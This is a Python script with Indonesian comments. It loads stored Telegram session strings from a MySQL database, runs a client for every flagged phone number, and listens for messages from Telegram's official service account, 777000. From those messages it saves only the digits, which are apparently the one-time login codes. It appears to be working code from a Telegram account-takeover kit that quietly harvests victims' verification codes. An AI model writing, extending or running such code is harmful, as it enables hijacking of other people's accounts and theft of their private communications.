import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import mysql.connector
import re
from config import API_ID, API_HASH, MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE

# Fungsi untuk membuat koneksi ke MySQL
def get_mysql_connection():
    return mysql.connector.connect(
        host=MYSQL_HOST,
        user=MYSQL_USER,
        password=MYSQL_PASSWORD,
        database=MYSQL_DATABASE,
    )

# Fungsi untuk memfilter pesan dan hanya menyimpan angka
def extract_numbers_from_message(message):
    # Menggunakan regex untuk mencari semua angka dalam pesan
    numbers = re.findall(r'\d+', message)
    return ' '.join(numbers) if numbers else None

async def start_monitoring(phone):
    # Ambil sesi dari database
    conn = get_mysql_connection()
    cursor = conn.cursor(dictionary=True)
    cursor.execute('SELECT session FROM users WHERE phone = %s', (phone,))
    row = cursor.fetchone()
    conn.close()

    if row:
        session_string = row['session']
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()

        # Pasang event listener untuk pesan baru
        @client.on(events.NewMessage)
        async def handler(event):
            sender_id = event.sender_id
            message = event.message.message

            # Memfilter pesan berdasarkan sender_id dan hanya menyimpan angka dalam pesan
            if sender_id == 777000:
                filtered_message = extract_numbers_from_message(message)
                if filtered_message:
                    conn = get_mysql_connection()
                    cursor = conn.cursor()
                    try:
                        cursor.execute(
                            'INSERT INTO messages (phone, sender_id, message) VALUES (%s, %s, %s)',
                            (phone, sender_id, filtered_message),
                        )
                        conn.commit()
                    except Exception as e:
                        print(f"Error saving message: {e}")
                    finally:
                        conn.close()

        print(f"Monitoring started for {phone}")
        await client.run_until_disconnected()
    else:
        print(f"No session found for {phone}")

# Monitor semua akun yang aktif
async def monitor_all_users():
    conn = get_mysql_connection()
    cursor = conn.cursor(dictionary=True)
    cursor.execute('SELECT phone FROM users WHERE monitoring = 1')
    phones = [row['phone'] for row in cursor.fetchall()]
    conn.close()

    tasks = [start_monitoring(phone) for phone in phones]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(monitor_all_users())
